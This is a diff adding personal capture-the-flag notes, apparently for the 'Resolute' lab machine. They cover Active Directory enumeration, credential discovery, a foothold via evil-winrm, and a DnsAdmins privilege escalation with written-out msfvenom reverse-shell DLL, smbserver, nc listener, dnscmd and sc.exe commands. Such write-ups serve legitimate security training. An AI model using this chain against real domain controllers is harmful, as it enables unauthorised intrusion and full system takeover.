@@ -1,0 +1,67 @@
+* Resolute
+** Enumeration
+*** meta
+# Nmap 7.80 scan initiated Sat May  9 20:02:04 2020 as: nmap -Pn -sC -sV -oA logs/nmap 10.10.10.169
+Nmap scan report for 10.10.10.169
+Host is up (0.028s latency).
+Not shown: 989 closed ports
+Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
+*** 53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+~dig -x $TARGET @$TARGET doesn't give a dns listing for the reverse lookup
+*** 88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-09 19:12:27Z)
+*** 135/tcp  open  msrpc        Microsoft Windows RPC
+~rpcclient -U "" -N $TARGET~ *does* enumerate the domain users!
+but running
+~GetNPUsers.py megabank/$user -request -no-pass -dc-ip $TARGET~
+against each user in that list shows no kerberos pre-auth :(
+~rpcclient -U "" -N $TARGET -c "queryuser $user"~ for each user eventually turns up a password in a description
+*** 139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+*** 389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+*** 445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
+~smbclient -L $TARGET~ doesn't list any shares :(
+*** 464/tcp  open  kpasswd5?
+*** 593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+*** 636/tcp  open  tcpwrapped
+*** 3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+*** 3269/tcp open  tcpwrapped
+** Foothold
+https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
+~enum4linux~ doesn't help much, but does reveal the domain name: ~megabank~
+*evil-winrm* with user melanie but with marko's default password provides the foothold
+USER: 0c3be45fcfe249796ccbee8d3a978540
+
+** Escalation
+
+Run winPEASany -- not much there
+
+Poking around the C drive -- use this PowerShell helper function to show hidden files:
+
+#+BEGIN_SRC powershell
+function la {Param($path = ".") dir $path -Force}
+#+END_SRC
+
+Found a powershell transcript with a password at: 
+~C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt~
+
+Now got ~ryan~, found one file about reverting system changes.
+Run winPEAS
+
+Check ~whoami /groups~ as well as ~whoami /priv~: ryan is a member of ~DnsAdmins~
+https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2
+
+That guide works pretty much as-is, but here are the key commands:
+attack: ~msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.100 LPORT=4242 -f dll > smb/privesc32.dll~
+attack: ~sudo $HOME/.local/bin/smbserver.py frenata smb~
+attack: ~nc -lvnp 4242~
+server: ~dnscmd resolute.megabank.local /config /serverlevelplugindll \\10.10.16.100\frenata\privesc.dll~
+server: ~& sc.exe \\resolute.megabank.local stop dns~
+server: ~& sc.exe \\resolute.megabank.local start dns~
+attack: ~whoami~
+
+other relevant refs:
+https://netsec.ws/?p=331
+https://ss64.com/nt/sc.html
